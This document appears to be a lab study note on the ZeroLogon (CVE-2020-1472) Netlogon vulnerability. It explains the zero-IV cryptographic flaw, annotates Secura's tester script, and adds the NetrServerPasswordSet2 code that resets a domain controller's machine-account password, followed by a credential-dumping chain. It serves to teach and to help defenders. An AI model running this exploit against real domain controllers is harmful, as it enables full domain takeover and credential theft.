# Zero Logon

Learn about and exploit the ZeroLogon vulnerability that allows an attacker to go from Zero to Domain Admin without any valid credentials.

* Defenders can better understand the threat.
* "Proof of Concept" emphasis for educational purpose.

## Zero Day

On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute.

Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol).

* MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts.
* The attack focuses on poor implementation of Cryptography. Specifically, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential that had hard coded Initialization Vector to use all zeros instead of a random string.
  * When an attacker sends a message only containing zeros with the IV of zero, there is a 1/256 chance the Ciphertext will be zero.

### Machine Accounts

A statistics based attack on any user account will get locked out. Machine accounts behave differently than standard user accounts.&#x20;

* No predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them.
* They are not meant to be accessed by an end user by any means.

### Abusing the Vulnerability

Machine accounts often hold system level privileges which can be used for a variety of things. The Domain Controller's Machine Account can be taken over and attempt to use the granted authentication with Secretsdump.py (password dumping utility) to dump all of the passwords within the domain.

* Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -> Run Secretsdump.py to dump credentials -> Crack/Pass Domain Admin Hashes -> ??? -> Profit.

### Analyzing the MS-NRPC Logon Process

To analyze where the vulnerability occurs, here is a diagram provided by Secura as well as Documentation to decipher the magic behind Zero Logon.

<figure><img src="https://raw.githubusercontent.com/anir0y/thm-notes/main/zerologon/img/fig.png" alt=""><figcaption><p>MS-NRPC Logon Process</p></figcaption></figure>

1. The client creates a NetrServerReqChallenge and sends it with the following values:
   1. The DC.
   2. The Target Device (also the DC in this case).
   3. A Nonce (16 Bytes of Zero).
2. The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (called the Server Challenge), the server will send the Server Challenge back. _\[Figure 1. Step 2]_
3. The client (us) will compute it's NetLogon Credentials with the Server Challenge provided _\[Figure 1. Step 3]_. It uses the NetrServerAuthenticate3 method which requires the following parameters:
   1. A Custom Binding Handle (Impacket handles this for us).
   2. An Account Name (The Domain Controller's machine account name).
   3. A Secure Channel Type (Impacket sort of handles this, but still need to specify it: \[nrpc.\[NETLOGON\_SECURE\_CHANNEL\_TYPE.ServerSecureChannel]).
   4. The Computer Name (The Domain Controller).
   5. The Client Credential String (this will be 8 hextets of \x00 \[16 Bytes of Zero]).
   6. Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura).
4. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client. _\[Figure 1. Step 4.]_
5. If the server calculates the same value, the client will re-verify and mutual agreement is confirmed to agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful.

At this point, the attempt to exploit the Zero Logon vulnerability is under way. The above steps will be looped through a certain number of times to attempt the exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, where waiting for the Server to have the same computations as the client 1-in-256 chance.

Sources -

1. Tom Tervoort of Secura - https://www.secura.com/pathtoimg.php?id=2055
2. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9
3. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9

## Impacket Installation - Git Clone

Impacket can be annoying to deal with when it comes to modules within nrpc.py. The instructions to install Impacket:

```
python3 -m pip install virtualenv
python3 -m virtualenv impacketEnv
source impacketEnv/bin/activate
pip install git+https://github.com/SecureAuthCorp/impacket
```

After executing these commands, a Python3 Virtual Environment will be created to be compatible to modify the PoC to exploit Zero Logon.

## Proof of Concept

Proof of Concepts are important to every exploit to understand them. Secura was able to provide a working [Proof of Concept for Zero Logon](https://github.com/SecuraBV/CVE-2020-1472) - Provided a method to call ([NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)) to change a password over NRPC.

Download the PoC from Secura, which can be found here:

{% embed url="https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py" %}

From the script, lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries.

**Lines 3 - 13**

{% code lineNumbers="true" %}
```python
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%
```
{% endcode %}

**Lines 76  - 86**

{% code lineNumbers="true" %}
```python
if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon_tester.py <dc-name> <dc-ip>\n')
    print('Tests whether a domain controller is vulnerable to the Zerologon attack. Does not attempt to make any changes.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    [_, dc_name, dc_ip] = sys.argv

    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
```
{% endcode %}

At the bottom of the script:&#x20;

* Declares a main function within Python.
* Checks for the amount of parameters, and ensure it is exactly 3 (zerologon\_tester.py DCNAME IP).
* &#x20;Lines 3-5 print the help menu only if it is greater than 3 arguments, or less than 2 and exiting.
  * If the required arguments are supplied, line 8 the arguments are passed into two variables: dc\_name and dc\_ip. After, the dc\_name is stripped of "$" character. Then, it passes the variables and an additional, modified variable into a module called "perform\_attack".

**Lines 57 - 73**

{% code lineNumbers="true" %}
```python
def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    
    if not rpc_con:
      print('=', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nSuccess! DC can be fully compromised by a Zerologon attack.')
  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)
```
{% endcode %}

First line defined where the variables are being passed into for the local function, `\\DCNAME` being passed into the dc\_handle, dc\_ip to dc\_ip variable, and dc\_name passed into the target\_computer variable.

Line 4 sets the variable rpc\_con equal to none to keep track and see if authentication is successful or not. The script will continue until 2000 retries is hit.

Line 5 is where the retry to Zero Logon occurs in the form of a for loop.

Line 6 sets the rpc\_con variable to the output of a different function called "try\_zero\_authenticate" with a couple of variables passed to it - dc\_handle, dc\_ip, and target\_computer. The next few lines are checking if rpc\_con is equal to an invalid login attempt.

**Lines 20 - 25**

{% code lineNumbers="true" %}
```python
plaintext = b'\x00' * 8
  ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Send challenge and authentication request.
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(
      rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
      target_computer + '\x00', ciphertext, flags
    )
```
{% endcode %}

Line 1 and 2 establish new variables containing 16 Bytes of "\x00" to be used to exploit the Zero Logon vulnerability.

Line 4 contains variable called Flags - Default flags observed from a Windows 10 Client (AES-CFB8) with Sign and Seal bit disabled.

The client creates a NetrServerReqChallenge containing the following information required by the [Microsoft Documentation](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32). See how to interact with NRPC

```
 NTSTATUS NetrServerReqChallenge(
   [in, unique, string] LOGONSRV_HANDLE PrimaryName,
   [in, string] wchar_t* ComputerName,
   [in] PNETLOGON_CREDENTIAL ClientChallenge,
   [out] PNETLOGON_CREDENTIAL ServerChallenge
 );
```

The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 Bytes of "\x00".

The client will receive back: 

```
NTSTATUS NetrServerReqChallenge(
   [out] PNETLOGON_CREDENTIAL ServerChallenge
 );
```

**Line 44 - 54**

{% code lineNumbers="true" %}
```python
assert server_auth['ErrorCode'] == 0
    return rpc_con

  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
      
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')
```
{% endcode %}

Line 1 retrieves the Error Code from the server\_auth variable to establish an Authentication Session with the target device. If successful,  the rpc\_con variable will inform it has successfully bypassed Authentication with Zero Logon.

Lines 3 - 12 are for error handling so the program does not break and exit after receiving an error.

### Connecting the Pieces Together

{% embed url="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81" %}

The document outlines the information required to change a password over NRPC.

Looking at [NetrServerAuthenticate3](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9) and [NetrServerPasswordSet2](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81), we already have a handful of the information required, like the Primary Name, Account Name, Secure Channel Type, and the Computer Name.

* Need two values, the Authenticator and the ClearNewPassword value. Both of these are documented from Microsoft.

Another unknown, NETLOGON\_CREDENTIAL. Fortunately, Microsoft does have documentation for [NETLOGON\_CREDENTIAL](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-nrpc/d55e2632-7163-4f6c-b662-4b870e8cc1cd).

* Per the documentation, NETLOGON\_CREDENTIAL can take 8 bytes of data, the second bullet point outlines that "the data field carries 8 bytes of encrypted data, as specified in the Netlogon Credential Computation"

In order to change the password the Microsoft Documentation states that: The Netlogon Password consists of 512 bytes of random padding (minus the length of the password, so junk+password) with the last four bytes the length of the password, totaling 516 bytes.

Look at the [nrpc.py](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py) module within Impacket to see the required structure for how to craft a netrServerPasswordSet2 Request:

```python
def hNetrServerPasswordSet2(dce, primaryName, accountName, secureChannelType, computerName, authenticator, clearNewPasswordBlob):
    request = NetrServerPasswordSet2()
    request['PrimaryName'] = checkNullString(primaryName)
    request['AccountName'] = checkNullString(accountName)
    request['SecureChannelType'] = secureChannelType
    request['ComputerName'] = checkNullString(computerName)
    request['Authenticator'] = authenticator
    request['ClearNewPassword'] = clearNewPasswordBlob
    return dce.request(request)
```

The additional pre written code will be inserted before "return rpc\_con" on line 45 to successfully exploit Zero Logon.

```python
newPassRequest = nrpc.NetrServerPasswordSet2()
newPassRequest['PrimaryName'] = dc_handle + '\x00'
newPassRequest['AccountName'] = target_computer + '$\x00'
newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
auth = nrpc.NETLOGON_AUTHENTICATOR()
auth['Credential'] = b'\x00' * 8
auth['Timestamp'] = 0
newPassRequest['Authenticator'] = auth
newPassRequest['ComputerName'] = target_computer + '\x00'
newPassRequest['ClearNewPassword'] =  b'\x00' * 516
rpc_con.request(newPassRequest)
```
